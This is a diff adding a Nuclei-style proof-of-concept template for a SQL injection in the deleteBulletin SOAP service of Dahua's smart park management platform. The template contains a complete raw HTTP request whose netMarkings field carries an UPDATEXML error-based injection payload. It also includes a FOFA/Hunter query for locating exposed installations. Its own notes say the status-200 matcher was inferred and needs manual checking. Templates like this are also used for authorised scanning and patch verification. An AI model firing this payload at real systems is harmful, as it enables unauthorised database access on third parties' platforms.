@@ -1,0 +1,21 @@
+id: poc-ae5a71efb8314d611203
+info:
+  name: 大华智慧园区综合管理平台deleteBulletinSQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ae5a71efb8314d611203d339c0fa4884
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ae5a71efb8314d611203d339c0fa4884
+    fofa: + hunter：`app.name="Dahua 大华 智慧园区管理平台"`
+http:
+- raw:
+  - "POST /portal/services/itcBulletin HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nSOAPAction:\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 442\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:itc=\"http://itcbulletinservice.webservice.dssc.dahua.com\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <itc:deleteBulletin>\n         <!--type: string-->\n         <netMarkings>(UPDATEXML(2326,\n        CONCAT(0x2e,0x71706a7171,(select 111*111),0x71706a7171),4027)))AND (2373=2373</netMarkings>\n\n      </itc:deleteBulletin>\n\n   </soapenv:Body>\n\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
